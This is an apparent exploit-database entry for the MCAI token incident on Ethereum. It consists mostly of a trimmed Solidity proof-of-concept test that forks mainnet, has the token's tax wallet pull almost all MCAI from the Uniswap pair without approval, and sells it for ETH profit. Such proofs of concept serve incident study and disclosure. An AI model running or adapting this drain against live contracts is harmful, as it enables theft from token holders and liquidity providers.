# [?] MCAI - Tax wallet allowance bypass

## Summary
Severity: Unknown
Chain: Ethereum
Component: MCAI
Published: 2025-01-28
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/MCAI_exp.sol
Type: defi-exploit-poc

## Details
Lost: 12.03 WETH

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 21_720_380;
        vm.createSelectFork("mainnet", forkBlock);
        fundingToken = address(0);

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ATTACK_CONTRACT, "MCAI tax wallet");
        vm.label(MCAI, "MCAI");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(MCAI_WETH_PAIR, "MCAI/WETH pair");
        vm.label(UNISWAP_V2_ROUTER, "Uniswap V2 router");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        uint256 attackerBefore = ATTACKER.balance;
        MCAIExploit exploit = new MCAIExploit();

        // step 1: the tax wallet pulls 99.99% of MCAI from the pair without pair approval.
        uint256 pairMcaiBalance = IERC20(MCAI).balanceOf(MCAI_WETH_PAIR);
        uint256 drainAmount = pairMcaiBalance - pairMcaiBalance / 10_000;
        assertEq(IERC20(MCAI).allowance(MCAI_WETH_PAIR, ATTACK_CONTRACT), 0, "pair did not approve tax wallet");

        vm.prank(ATTACK_CONTRACT, ATTACKER);
        IERC20(MCAI).transferFrom(MCAI_WETH_PAIR, address(exploit), drainAmount);

        // step 2: the attacker-originated helper syncs, sells the drained MCAI, and forwards ETH to the EOA.
        vm.prank(ATTACKER, ATTACKER);
        exploit.attack();

        uint256 profit = ATTACKER.balance - attackerBefore;
        assertGt(profit, 11 ether, "ETH profit");
    }
}

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/MCAI_exp.sol_
